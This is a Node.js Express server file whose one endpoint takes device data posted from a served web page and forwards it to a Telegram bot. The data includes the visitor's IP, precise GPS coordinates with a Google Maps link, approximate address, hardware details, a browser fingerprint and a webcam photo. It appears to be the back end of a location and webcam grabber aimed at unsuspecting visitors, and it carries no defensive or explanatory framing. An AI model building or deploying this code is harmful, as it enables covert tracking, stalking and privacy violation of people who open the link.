// server.js
require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const geoip = require('geoip-lite');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));
app.use(cors());

// Enhanced Telegram sender with photo support
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { deviceInfo, photoData } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const ipInfo = geoip.lookup(deviceInfo.ip);
    const timestamp = new Date().toLocaleString();
    const mapLink = deviceInfo.location ? 
      `https://www.google.com/maps?q=${deviceInfo.location.latitude},${deviceInfo.location.longitude}` : 
      'N/A';

    const message = `
🚀 *Comprehensive Device Report* 🚀
📅 *Time:* ${timestamp}
🌐 *IP:* ${deviceInfo.ip || 'N/A'} (${ipInfo?.country || 'Unknown'})
📌 *Location:* 
   - Coordinates: ${deviceInfo.location ? `${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}` : 'N/A'}
   - Google Maps: [Click Here](${mapLink})
   - Accuracy: ${deviceInfo.location?.accuracy || 'N/A'} meters
   - Approx. Address: ${deviceInfo.approxAddress || 'N/A'}

📱 *Device Info:*
   - OS: ${deviceInfo.os || 'N/A'}
   - Browser: ${deviceInfo.browser || 'N/A'}
   - Device: ${deviceInfo.device || 'N/A'}
   - CPU Cores: ${deviceInfo.cpuCores || 'N/A'}
   - Screen: ${deviceInfo.screen || 'N/A'}
   - Memory: ${deviceInfo.memory || 'N/A'}
   - Touch Support: ${deviceInfo.isTouchDevice ? 'Yes' : 'No'}
   - Pixel Ratio: ${deviceInfo.pixelRatio || 'N/A'}
   - WebGL Renderer: ${deviceInfo.webGLRenderer || 'N/A'}
   - Fingerprint: ${deviceInfo.fingerprint || 'N/A'}

📷 *Photo Captured:* ${photoData ? 'Yes ✅' : 'No ❌'}
`;

    // First send the text message
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    });

    // If photo data exists, send it
    if (photoData) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', Buffer.from(photoData.split(',')[1], 'base64'), {
        filename: 'webcam-capture.jpg',
        contentType: 'image/jpeg'
      });
      form.append('caption', 'Webcam capture from device');

      await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
    }

    res.status(200).send('Data sent to Telegram');
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).send('Error sending data');
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});